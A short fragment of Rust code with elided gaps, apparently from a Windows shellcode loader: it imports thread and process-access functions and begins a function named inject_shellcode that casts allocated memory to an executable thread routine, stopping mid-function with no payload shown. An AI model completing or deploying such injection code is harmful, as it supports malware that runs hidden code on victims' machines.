...
use windows::Win32::System::{
    ...
    Threading::{CreateThread, GetCurrentProcess, OpenProcess, PROCESS_ALL_ACCESS, Sleep, THREAD_CREATION_FLAGS},
};
...
fn inject_shellcode() {
    unsafe {
        ...
        let f_ptr = transmute::<_, unsafe extern "system" fn(lpthreadparameter: *mut core::ffi::c_void) -> u32>(p_alloc);
